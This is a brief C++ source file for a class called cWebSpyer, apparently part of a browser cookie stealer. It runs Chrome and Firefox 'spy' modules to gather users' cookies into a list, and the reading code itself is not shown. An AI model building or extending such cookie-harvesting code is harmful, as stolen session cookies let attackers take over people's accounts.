#include "cWebSpyer.h"
#include "cSpyChrome.h"
#include "cSpyFireFox.h"

cWebSpyer::cWebSpyer()
{

}


cWebSpyer::~cWebSpyer()
{

}

void cWebSpyer::getCookies(vector<string> &p_refvtstrCookies)
{
	auto_ptr<IBrowser> browserSpy(NULL);

	//Spy chrome
	browserSpy.reset(new cSpyChrome());
	browserSpy->searchCookies(p_refvtstrCookies);

	//Spy firefox
	browserSpy.reset(new cSpyFireFox());
	browserSpy->searchCookies(p_refvtstrCookies);
}
